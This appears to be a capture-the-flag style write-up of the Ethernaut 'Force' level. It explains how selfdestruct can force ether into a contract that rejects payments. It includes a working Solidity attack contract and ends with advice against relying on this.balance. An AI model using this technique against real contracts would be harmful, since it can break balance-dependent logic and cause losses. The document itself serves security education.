The vulnerability that this contract tries to teach about is really interesting. Our goal is to increase the balance of a contract that does not allow us to transfer any amount of ether to it. How do we do that? The answer is on a function called `selfdestruct()`.

`selfdestruct(address)` is a function that allows us to destroy a smart contract and send its balance to the address that's specified. So, in order to send ether to the Force contract, we'll have a contract using selfdestruct and sending its ether to Force, whose balance will now increase.

The contract I've made to exploit this vulnerability is this:

```solidity


// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;


//Contract for exploiting the Force smart contract from ethernaut:
//https://ethernaut.openzeppelin.com/level/0x4e8Da8e21d27A10BA7d2510cB90338374828bE86

contract breakForce {
    
    address owner;
    address payable target;
    
    constructor(address payable addr) {
        owner = msg.sender;
        target = addr;
    }

    modifier onlyOwner {
        require(msg.sender == owner, "You are not the owner");
        _;
    }


    function attack() public payable onlyOwner{
        selfdestruct(target);
    }


}

```

We have to deploy this contract with our target address as a parameter. Then, we exploit the Force contract by calling the function attack while sending a bunch of ether. 

Because of the effect that `selfdestruct` can cause to the balance of any smart contract, it is important to take care of the way we measure the balance, trying to avoid the use of `this.balance` in favor of other ways of implementation, like storing it in a variable.